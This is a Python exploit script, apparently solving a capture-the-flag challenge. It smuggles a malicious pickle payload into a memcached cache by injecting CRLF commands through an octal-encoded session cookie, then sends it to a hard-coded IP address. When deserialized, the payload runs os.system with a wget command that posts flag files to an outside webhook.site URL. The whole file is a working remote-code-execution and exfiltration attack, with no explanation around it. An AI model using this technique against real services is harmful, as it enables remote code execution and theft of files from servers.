import pickle
import os
import requests as r
class RCE:
    def __reduce__(self):
        cmd = ('wget https://webhook.site/4620a451-301d-4dc2-8018-7e373d2d04b8 --post-file /flag*.txt')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset foo:123 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get foo:123')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

url = "http://83.136.249.153:48512/set"

response = r.get(url, cookies={"session": generate_exploit()}, params={'uicolor': "test"}, allow_redirects=True)

print(response.headers)